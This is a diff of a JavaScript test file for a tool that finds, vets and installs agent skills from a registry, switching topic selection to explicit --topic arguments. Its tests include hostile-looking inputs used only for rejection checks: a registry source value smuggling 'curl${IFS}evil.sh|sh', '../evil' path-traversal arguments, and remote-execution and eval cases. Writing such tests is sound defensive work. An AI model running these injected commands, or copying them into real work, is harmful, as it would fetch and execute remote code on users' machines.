@@ -22,12 +22,6 @@ function putTrusted(dataDir, authors) {
   fs.writeFileSync(file, JSON.stringify({ authors }))
 }
 
-function writeIntent(repoDir, feature, text) {
-  const dir = path.join(repoDir, feature)
-  fs.mkdirSync(dir, { recursive: true })
-  fs.writeFileSync(path.join(dir, 'intent.md'), text + '\n')
-}
-
 function writeSkill(root, name, opts = {}) {
   const dir = path.join(root, name)
   fs.mkdirSync(dir, { recursive: true })
@@ -130,27 +124,26 @@ function setup(t, feature = 'specs/001-quest') {
   return { repo, data, feature }
 }
 
-function callFind(w, fake, { intent, findArgs = {} } = {}) {
-  writeIntent(w.repo.dir, w.feature, intent)
+function callFind(w, fake, { topics = ['godot'], findArgs = {} } = {}) {
   return design.findForDesign({
     cwd: w.repo.dir,
     feature: w.feature,
     home: fake.home,
     dataDir: w.data,
     env: fake.env,
+    topics,
     ...findArgs,
   })
 }
 
-const GODOT_INTENT = 'Design a godot quest: the hero learns gdscript triggers room by room.'
 const GODOT_FIND = `${GODOT_SOURCE}@godot-helper  1.2K installs\n`
 
-test('R22: only the words of intent.md activate a topic; a Dockerfile in the repo does not', (t) => {
+test('R22: without a scout topic nothing is searched, whatever the repo holds', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND })
   fs.writeFileSync(path.join(w.repo.dir, 'Dockerfile'), 'FROM node:22\n')
   fs.writeFileSync(path.join(w.repo.dir, 'game.ipynb'), '{"cells": []}\n')
-  const r = callFind(w, fake, { intent: 'A user profile page with an avatar upload and a bio field.' })
+  const r = callFind(w, fake, { topics: [] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.deepEqual(r.topics, [])
   assert.deepEqual(r.candidates, [])
@@ -161,7 +154,7 @@ test('R22: a covered topic in the project is not searched', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND })
   writeSkill(path.join(w.repo.dir, '.agents', 'skills'), 'godot-helper', {})
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.deepEqual(r.topics, [])
   assert.equal(fake.counts().find, 0)
@@ -171,7 +164,7 @@ test('R22: a covered topic in the personal skills is not searched', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND })
   writeSkill(path.join(fake.home, '.agents', 'skills'), 'my-godot', {})
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.deepEqual(r.topics, [])
   assert.equal(fake.counts().find, 0)
@@ -185,37 +178,29 @@ test('R22: a covered topic registered in installs.jsonl is not searched', (t) =>
   const installs = path.join(w.data, 'skills', 'installs.jsonl')
   fs.mkdirSync(path.dirname(installs), { recursive: true })
   fs.appendFileSync(installs, JSON.stringify({ time: 1, session: null, source: GODOT_SOURCE, scope: 'project', repo: w.repo.dir, name: 'godot-helper', path: path.join(installed, 'godot-helper'), hash: 'x' }) + '\n')
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.deepEqual(r.topics, [])
   assert.equal(fake.counts().find, 0)
 })
 
-test('R22: the query is topic.query, else topic.label, else the id with spaces', (t) => {
+test('R22: the query is the topic id with spaces', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, {
     find: { byQuery: {
-      'qq-one': `${GODOT_SOURCE}@alpha-skill  10 installs\n`,
-      'Label Bee': `${GODOT_SOURCE}@beta-skill  10 installs\n`,
-      'cee cee': `${GODOT_SOURCE}@cee-skill  10 installs\n`,
+      'alpha x': `${GODOT_SOURCE}@alpha-skill  10 installs of an alpha x helper\n`,
+      'beta y': `${GODOT_SOURCE}@beta-skill  10 installs of a beta y helper\n`,
+      'cee cee': `${GODOT_SOURCE}@cee-skill  10 installs of a cee cee helper\n`,
     } },
     skills: {
-      'alpha-skill': { description: 'Helps with alpha tasks.' },
-      'beta-skill': { description: 'Helps with beta tasks.' },
-      'cee-skill': { description: 'Helps with cee tasks.' },
+      'alpha-skill': { description: 'Helps with alpha x tasks.' },
+      'beta-skill': { description: 'Helps with beta y tasks.' },
+      'cee-skill': { description: 'Helps with cee cee tasks.' },
     },
   })
-  const config = {
-    repeat: { minWordLength: 3, similarityThreshold: 0.55, stopwords: [] },
-    topics: [
-      { id: 'alpha-x', label: 'Alpha Ex', query: 'qq-one', words: ['alpha'], skillKeywords: ['alpha'] },
-      { id: 'beta-y', label: 'Label Bee', words: ['beta'], skillKeywords: ['beta'] },
-      { id: 'cee-cee', words: ['cee'], skillKeywords: ['cee'] },
-    ],
-  }
-  const r = callFind(w, fake, { intent: 'alpha beta cee work', findArgs: { config } })
+  const r = callFind(w, fake, { topics: ['alpha-x', 'beta-y', 'cee-cee'] })
   assert.equal(r.ok, true, JSON.stringify(r))
-  assert.deepEqual(fake.counts().queries, ['qq-one', 'Label Bee', 'cee cee'])
+  assert.deepEqual(fake.counts().queries, ['alpha x', 'beta y', 'cee cee'])
   assert.equal(r.candidates.length, 3)
 })
 
@@ -230,7 +215,7 @@ test('R22: a candidate that does not match the topic, or duplicates an installed
     ].join('\n') + '\n',
     skills: { 'godot-helper': {} },
   })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.deepEqual(r.candidates.map((c) => c.name), ['godot-helper'])
   assert.equal(r.candidates[0].topic, 'godot')
@@ -240,7 +225,7 @@ test('R23: a valid skill of a trusted author is downloaded once, hashed, reviewe
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': {} } })
   const before = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: w.repo.dir, encoding: 'utf8' }).stdout.trim()
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.equal(r.candidates.length, 1)
   const [candidate] = r.candidates
@@ -303,7 +288,7 @@ for (const [defect, entry] of Object.entries(DEFECTS)) {
     const w = setup(t)
     const name = entry.name || 'godot-helper'
     const fake = fakeRegistry(t, { find: entry.find || GODOT_FIND, skills: { [name]: entry.spec || entry } })
-    const r = callFind(w, fake, { intent: GODOT_INTENT })
+    const r = callFind(w, fake, { topics: ['godot'] })
     assert.equal(r.ok, true, JSON.stringify(r))
     assert.equal(r.candidates.length, 0)
     assert.equal(r.rejected.length, 1)
@@ -316,21 +301,12 @@ for (const [defect, entry] of Object.entries(DEFECTS)) {
 
 test('R23: at most 1 candidate per topic and 3 per design; install refuses a 4th and an id find did not give', (t) => {
   const w = setup(t)
-  const config = {
-    repeat: { minWordLength: 3, similarityThreshold: 0.55, stopwords: [] },
-    topics: [
-      { id: 'alpha-x', label: 'Alpha', words: ['alpha'], skillKeywords: ['alpha'] },
-      { id: 'beta-y', label: 'Beta', words: ['beta'], skillKeywords: ['beta'] },
-      { id: 'cee-cee', label: 'Cee', words: ['cee'], skillKeywords: ['cee'] },
-      { id: 'dee-dee', label: 'Dee', words: ['dee'], skillKeywords: ['dee'] },
-    ],
-  }
   const byQuery = {}
-  for (const q of ['Alpha', 'Beta', 'Cee', 'Dee']) byQuery[q] = `${GODOT_SOURCE}@${q.toLowerCase()}-skill  5 installs\n`
+  for (const q of ['alpha x', 'beta y', 'cee cee', 'dee dee']) byQuery[q] = `${GODOT_SOURCE}@${q.replace(/ /g, '-')}-skill  5 installs\n`
   const skills = {}
-  for (const q of ['alpha', 'beta', 'cee', 'dee']) skills[`${q}-skill`] = { description: `Helps with ${q} tasks.` }
+  for (const q of ['alpha x', 'beta y', 'cee cee', 'dee dee']) skills[`${q.replace(/ /g, '-')}-skill`] = { description: `Helps with ${q} tasks.` }
   const fake = fakeRegistry(t, { find: { byQuery }, skills })
-  const r = callFind(w, fake, { intent: 'alpha beta cee dee work', findArgs: { config } })
+  const r = callFind(w, fake, { topics: ['alpha-x', 'beta-y', 'cee-cee', 'dee-dee'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.equal(r.candidates.length, 3)
   assert.ok(r.candidates.every((c, i, all) => all.findIndex((o) => o.topic === c.topic) === i), 'at most 1 per topic')
@@ -349,7 +325,7 @@ test('R23: at most 1 candidate per topic and 3 per design; install refuses a 4th
 test('R23: an install whose copy hash differs from the reviewed hash is removed and fails', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': {} } })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.candidates.length, 1)
   const [candidate] = r.candidates
   fs.appendFileSync(path.join(candidate.dir, '.agents', 'skills', 'godot-helper', 'SKILL.md'), 'tampered\n')
@@ -362,7 +338,7 @@ test('R23: an install whose copy hash differs from the reviewed hash is removed 
 test('R23: install never overwrites an existing skill of the same name', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': {} } })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.candidates.length, 1)
   writeSkill(path.join(w.repo.dir, '.agents', 'skills'), 'godot-helper', { description: 'The owners own take on stews.' })
   const before = fs.readFileSync(path.join(w.repo.dir, '.agents', 'skills', 'godot-helper', 'SKILL.md'), 'utf8')
@@ -381,7 +357,7 @@ test('R24: a skill of an author outside trusted.json, or with no author, is not 
       const w = setup(t)
       const skillName = line.includes('rogue') ? 'rogue-helper' : 'web-helper'
       const fake = fakeRegistry(t, { find: line + '\n', skills: { [skillName]: { description: 'Build Godot scenes with GDScript.' } } })
-      const first = callFind(w, fake, { intent: GODOT_INTENT })
+      const first = callFind(w, fake, { topics: ['godot'] })
       assert.equal(first.ok, true, JSON.stringify(first))
       assert.deepEqual(first.candidates, [])
       assert.equal(fake.counts().add, 0, 'nothing is downloaded')
@@ -395,7 +371,7 @@ test('R24: a skill of an author outside trusted.json, or with no author, is not 
       assert.ok(pending[0].author !== undefined, 'the entry carries the author')
       assert.ok(String(pending[0].command).includes('npx skills@1.9.0 add'), 'the entry carries the suggested command')
       assert.equal(pending[0].reason, 'author not in trusted.json')
-      const second = callFind(w, fake, { intent: GODOT_INTENT })
+      const second = callFind(w, fake, { topics: ['godot'] })
       assert.equal(second.ok, true, JSON.stringify(second))
       assert.equal(readPending(w.repo.dir).length, 1, 'a second find adds no identical entry')
       assert.equal(second.pending.length, 1, 'pending still lists it')
@@ -412,7 +388,7 @@ test('R25: a search with no network, a process error, garbage output or a timeou
     await t.test(title, () => {
       const w = setup(t)
       const fake = fakeRegistry(t, { find })
-      const r = callFind(w, fake, { intent: GODOT_INTENT })
+      const r = callFind(w, fake, { topics: ['godot'] })
       assert.equal(r.ok, false)
       assert.ok(r.errors.length > 0)
       assert.deepEqual(r.candidates, [])
@@ -421,15 +397,14 @@ test('R25: a search with no network, a process error, garbage output or a timeou
   await t.test('timeout', () => {
     const w = setup(t)
     const fake = fakeRegistry(t, { find: { mode: 'slow' } })
-    const r = callFind(w, fake, { intent: GODOT_INTENT })
+    const r = callFind(w, fake, { topics: ['godot'] })
     assert.equal(r.ok, false)
     assert.ok(r.errors.length > 0)
   })
   await t.test('garbage output exits 0 with one JSON line', () => {
     const w = setup(t)
     const fake = fakeRegistry(t, { find: 'knitting patterns and wool\n' })
-    writeIntent(w.repo.dir, w.feature, GODOT_INTENT)
-    const r = runBin(PLAN_BIN, ['skills', 'find', w.feature], w.repo.dir, { ...fake.env, AETHER_DATA_DIR: w.data })
+    const r = runBin(PLAN_BIN, ['skills', 'find', w.feature, '--topic', 'godot'], w.repo.dir, { ...fake.env, AETHER_DATA_DIR: w.data })
     assert.equal(r.status, 0, r.stdout + r.stderr)
     assert.equal(r.json.ok, false)
     assert.ok(r.json.errors.length > 0)
@@ -439,7 +414,7 @@ test('R25: a search with no network, a process error, garbage output or a timeou
 test('discard removes the review folder; an unknown id is an error line, not a crash', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': {} } })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.candidates.length, 1)
   const [candidate] = r.candidates
   const gone = design.discardForDesign({ id: candidate.id, dataDir: w.data })
@@ -456,7 +431,6 @@ test('discard removes the review folder; an unknown id is an error line, not a c
 test('skills find resolves the data dir without AETHER_DATA_DIR, from CLAUDE_CONFIG_DIR', (t) => {
   const repo = makeRepo(t)
   const feature = 'specs/001-quest'
-  writeIntent(repo.dir, feature, GODOT_INTENT)
   const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': {} } })
   const cfg = tempDir(t, 'aether-cfg-')
   const dataDir = path.join(cfg, 'plugins', 'data', 'aether-inline')
@@ -464,7 +438,7 @@ test('skills find resolves the data dir without AETHER_DATA_DIR, from CLAUDE_CON
   const env = { ...fake.env, CLAUDE_CONFIG_DIR: cfg }
   delete env.AETHER_DATA_DIR
   assert.equal('AETHER_DATA_DIR' in env, false, 'the test really omits AETHER_DATA_DIR')
-  const r = runBin(PLAN_BIN, ['skills', 'find', feature], repo.dir, env)
+  const r = runBin(PLAN_BIN, ['skills', 'find', feature, '--topic', 'godot'], repo.dir, env)
   assert.equal(r.status, 0, r.stdout + r.stderr)
   assert.equal(r.json.ok, true, r.stdout)
   assert.equal(r.json.candidates.length, 1)
@@ -479,7 +453,7 @@ test('R23: a registry name that is not a safe id is never downloaded and writes 
     await t.test(name, () => {
       const w = setup(t)
       const fake = fakeRegistry(t, { find: `${GODOT_SOURCE}@${name}  5 installs of a godot helper\n`, skills: {} })
-      const r = callFind(w, fake, { intent: GODOT_INTENT })
+      const r = callFind(w, fake, { topics: ['godot'] })
       assert.deepEqual(r.candidates, [])
       assert.equal(fake.counts().add, 0, 'the CLI is never called')
       assert.equal(fs.existsSync(path.join(w.repo.dir, '.agents')), false, 'nothing is written to the project')
@@ -493,7 +467,7 @@ test('R23: a registry name that is not a safe id is never downloaded and writes 
 test('install refuses a review whose name is not a safe id and writes nothing outside .agents/skills', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': {} } })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.candidates.length, 1)
   const [candidate] = r.candidates
   fs.cpSync(path.join(candidate.dir, '.agents', 'skills', 'godot-helper'), path.join(candidate.dir, '.agents', 'evil-x'), { recursive: true })
@@ -516,8 +490,7 @@ test('R24: from a linked worktree the pending entry lands in the main checkout',
   const added = spawnSync('git', ['worktree', 'add', wtDir], { cwd: w.repo.dir, encoding: 'utf8' })
   assert.equal(added.status, 0, added.stderr)
   t.after(() => { spawnSync('git', ['worktree', 'remove', '--force', wtDir], { cwd: w.repo.dir }) })
-  writeIntent(wtDir, w.feature, GODOT_INTENT)
-  const r = design.findForDesign({ cwd: wtDir, feature: w.feature, home: fake.home, dataDir: w.data, env: fake.env })
+  const r = design.findForDesign({ cwd: wtDir, feature: w.feature, home: fake.home, dataDir: w.data, env: fake.env, topics: ['godot'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.equal(r.pending.length, 1)
   assert.equal(readPending(w.repo.dir).length, 1, 'the entry lands in the main checkout')
@@ -530,7 +503,7 @@ test('R23: install records skills-lock.json and warns when the lock cannot be up
     const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': {} } })
     const lockFile = path.join(w.repo.dir, 'skills-lock.json')
     fs.writeFileSync(lockFile, JSON.stringify({ version: 1, skills: { 'other-skill': { source: 'x/y', computedHash: 'z' } } }, null, 2) + '\n')
-    const r = callFind(w, fake, { intent: GODOT_INTENT })
+    const r = callFind(w, fake, { topics: ['godot'] })
     const installed = design.installForDesign({ cwd: w.repo.dir, feature: w.feature, id: r.candidates[0].id, home: fake.home, dataDir: w.data, env: fake.env })
     assert.equal(installed.ok, true, JSON.stringify(installed))
     assert.deepEqual(installed.warnings, [])
@@ -542,7 +515,7 @@ test('R23: install records skills-lock.json and warns when the lock cannot be up
   await t.test('without a lock file', () => {
     const w = setup(t)
     const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': {} } })
-    const r = callFind(w, fake, { intent: GODOT_INTENT })
+    const r = callFind(w, fake, { topics: ['godot'] })
     const installed = design.installForDesign({ cwd: w.repo.dir, feature: w.feature, id: r.candidates[0].id, home: fake.home, dataDir: w.data, env: fake.env })
     assert.equal(installed.ok, true, JSON.stringify(installed))
     assert.equal(fs.existsSync(path.join(w.repo.dir, 'skills-lock.json')), false, 'no lock file is created')
@@ -554,7 +527,7 @@ test('R23: install records skills-lock.json and warns when the lock cannot be up
       const lockFile = path.join(w.repo.dir, 'skills-lock.json')
       if (content === null) fs.mkdirSync(lockFile)
       else fs.writeFileSync(lockFile, content)
-      const r = callFind(w, fake, { intent: GODOT_INTENT })
+      const r = callFind(w, fake, { topics: ['godot'] })
       const installed = design.installForDesign({ cwd: w.repo.dir, feature: w.feature, id: r.candidates[0].id, home: fake.home, dataDir: w.data, env: fake.env })
       assert.equal(installed.ok, true, JSON.stringify(installed))
       assert.ok(installed.warnings.length > 0, 'the lock failure is reported, not a silent success')
@@ -569,7 +542,7 @@ test('R23: a SKILL.md directory fails the code stage without a crash and the rev
   fs.rmSync(path.join(srcSkill, 'SKILL.md'))
   fs.mkdirSync(path.join(srcSkill, 'SKILL.md'), { recursive: true })
   fs.writeFileSync(path.join(srcSkill, 'SKILL.md', 'note.md'), 'Build Godot scenes with GDScript triggers.\n')
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.candidates.length, 0)
   assert.equal(r.rejected.length, 1)
   assert.ok(r.rejected[0].reasons.length > 0, 'reasons is non-empty')
@@ -581,7 +554,7 @@ test('R25: a slow search fails fast with an injectable timeout', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: { mode: 'slow' } })
   const started = Date.now()
-  const r = callFind(w, fake, { intent: GODOT_INTENT, findArgs: { timeoutMs: 500 } })
+  const r = callFind(w, fake, { topics: ['godot'], findArgs: { timeoutMs: 500 } })
   assert.equal(r.ok, false)
   assert.match(r.errors.join('\n'), /timed out/)
   assert.ok(Date.now() - started < 10000, 'it fails fast instead of waiting out the production limit')
@@ -615,8 +588,7 @@ else if (args[0] === 'add') {
 `)
   fs.chmodSync(bin, 0o755)
   const env = { AETHER_SKILLS_BIN: bin, HOME: home, SKILLS_STDIN_MARKER: marker, SKILLS_STDIN_SRC: src }
-  writeIntent(w.repo.dir, w.feature, GODOT_INTENT)
-  const r = design.findForDesign({ cwd: w.repo.dir, feature: w.feature, home, dataDir: w.data, env })
+  const r = design.findForDesign({ cwd: w.repo.dir, feature: w.feature, home, dataDir: w.data, env, topics: ['godot'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.equal(r.candidates.length, 1)
   assert.equal(fs.readFileSync(marker, 'utf8'), 'eof-at-once')
@@ -628,7 +600,7 @@ test('R23: model.eval() and process.env.HOME pass the code stage', (t) => {
     find: GODOT_FIND,
     skills: { 'godot-helper': { files: { 'eval.py': 'model.eval()\nprint("done")\n', 'app.js': 'const home = process.env.HOME\nconsole.log(home)\n' } } },
   })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.equal(r.candidates.length, 1, JSON.stringify(r.rejected))
 })
@@ -643,7 +615,7 @@ test('R23: eval( and real .env file references stay rejected', async (t) => {
     await t.test(title, () => {
       const w = setup(t)
       const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': { files: { 'run.sh': content } } } })
-      const r = callFind(w, fake, { intent: GODOT_INTENT })
+      const r = callFind(w, fake, { topics: ['godot'] })
       assert.equal(r.candidates.length, 0, title)
       assert.equal(r.rejected.length, 1, title)
       assert.ok(r.rejected[0].reasons.length > 0, title)
@@ -674,7 +646,7 @@ for (const [title, content] of REMOTE_EXEC_CASES) {
   test(`R23: remote execution is rejected: ${title}`, (t) => {
     const w = setup(t)
     const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': { files: { 'fetch.sh': content } } } })
-    const r = callFind(w, fake, { intent: GODOT_INTENT })
+    const r = callFind(w, fake, { topics: ['godot'] })
     assert.equal(r.candidates.length, 0, title)
     assert.equal(r.rejected.length, 1, title)
     assert.ok(r.rejected[0].reasons.length > 0, title)
@@ -684,19 +656,13 @@ for (const [title, content] of REMOTE_EXEC_CASES) {
 test('R23: curl piped to sha256sum passes the code stage', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': { files: { 'verify.sh': 'curl https://example.com/x.tar.gz | sha256sum -c\n' } } } })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.ok, true, JSON.stringify(r))
   assert.equal(r.candidates.length, 1, JSON.stringify(r.rejected))
 })
 
 test('R23: a downloaded SKILL.md that duplicates an already accepted topic is rejected', (t) => {
   const w = setup(t)
-  const config = {
-    topics: [
-      { id: 'godot', words: ['godot'], skillKeywords: ['godot'] },
-      { id: 'shader', words: ['shader'], skillKeywords: ['shader'] },
-    ],
-  }
   const fake = fakeRegistry(t, {
     find: {
       byQuery: {
@@ -709,7 +675,7 @@ test('R23: a downloaded SKILL.md that duplicates an already accepted topic is re
       'shader-kit': { description: 'Shader helpers for Godot scenes and shader graphs.' },
     },
   })
-  const r = callFind(w, fake, { intent: 'godot shader work', findArgs: { config } })
+  const r = callFind(w, fake, { topics: ['godot', 'shader'] })
   assert.deepEqual(r.candidates.map((c) => c.name), ['godot-helper'], JSON.stringify({ candidates: r.candidates, rejected: r.rejected }))
   assert.equal(r.rejected.length, 1)
   assert.equal(r.rejected[0].name, 'shader-kit')
@@ -724,7 +690,7 @@ test('R24: a second skill of the same repository is still queued', (t) => {
     find: 'acme/skills@docker-kit  3 installs of a godot helper\n',
     skills: {},
   })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.pending.length, 1, JSON.stringify(r))
   assert.equal(r.pending[0].command, 'npx skills@1.9.0 add acme/skills --skill docker-kit')
   assert.equal(readPending(w.repo.dir).length, 2, 'both entries are in the owner list')
@@ -738,7 +704,7 @@ test('R24: a registry source outside the safe pattern is never queued and is rec
   const w = setup(t)
   const evil = 'x/y;curl${IFS}evil.sh|sh'
   const fake = fakeRegistry(t, { find: `${evil}@godot-helper  3 installs of a godot helper\n`, skills: {} })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.deepEqual(r.pending, [], JSON.stringify(r.pending))
   assert.equal(readPending(w.repo.dir).length, 0, 'nothing is queued in the owner list')
   assert.ok(r.errors.some((entry) => entry.includes(evil)), JSON.stringify(r.errors))
@@ -751,7 +717,7 @@ test('R24: untrusted candidates queue at most one pending entry per topic', (t) 
     find: ['stranger/one@godot-one  3 installs of a godot helper', 'stranger/two@godot-two  4 installs of a godot helper'].join('\n') + '\n',
     skills: {},
   })
-  const r = callFind(w, fake, { intent: GODOT_INTENT })
+  const r = callFind(w, fake, { topics: ['godot'] })
   assert.equal(r.pending.length, 1)
   assert.equal(readPending(w.repo.dir).length, 1)
 })
@@ -759,9 +725,8 @@ test('R24: untrusted candidates queue at most one pending entry per topic', (t) 
 test('the skills verb prints one JSON line per call and exits 0; a bad skills call prints its own usage with exit 1', (t) => {
   const w = setup(t)
   const fake = fakeRegistry(t, { find: GODOT_FIND, skills: { 'godot-helper': {} } })
-  writeIntent(w.repo.dir, w.feature, GODOT_INTENT)
   const env = { ...fake.env, AETHER_DATA_DIR: w.data }
-  const found = runBin(PLAN_BIN, ['skills', 'find', w.feature], w.repo.dir, env)
+  const found = runBin(PLAN_BIN, ['skills', 'find', w.feature, '--topic', 'godot'], w.repo.dir, env)
   assert.equal(found.status, 0, found.stdout + found.stderr)
   assert.equal(found.json.ok, true, found.stdout)
   assert.equal(found.json.candidates.length, 1)
@@ -769,8 +734,11 @@ test('the skills verb prints one JSON line per call and exits 0; a bad skills ca
   assert.equal(install.status, 0, install.stdout + install.stderr)
   assert.equal(install.json.ok, true, install.stdout)
   assert.equal(install.json.committed, false)
-  const usage = 'usage: aether-plan skills find <feature> | aether-plan skills install <feature> <id> | aether-plan skills discard <id>'
-  for (const argv of [['skills'], ['skills', 'fetch', 'x'], ['skills', 'find'], ['skills', 'install', w.feature], ['skills', 'install', w.feature, '../evil'], ['skills', 'discard'], ['skills', 'discard', '../evil']]) {
+  const empty = runBin(PLAN_BIN, ['skills', 'find', w.feature], w.repo.dir, env)
+  assert.equal(empty.status, 0, empty.stdout + empty.stderr)
+  assert.deepEqual(empty.json, { ok: true, topics: [], candidates: [], rejected: [], pending: [], errors: [] }, 'no --topic answers empty lists, not a candidate')
+  const usage = design.SKILLS_USAGE
+  for (const argv of [['skills'], ['skills', 'fetch', 'x'], ['skills', 'find'], ['skills', 'find', w.feature, '--topic'], ['skills', 'find', w.feature, 'godot'], ['skills', 'install', w.feature], ['skills', 'install', w.feature, '../evil'], ['skills', 'discard'], ['skills', 'discard', '../evil']]) {
     const bad = runBin(PLAN_BIN, argv, w.repo.dir, env)
     assert.equal(bad.status, 1, argv.join(' '))
     assert.deepEqual(bad.json, { ok: false, errors: [usage], warnings: [] }, argv.join(' '))
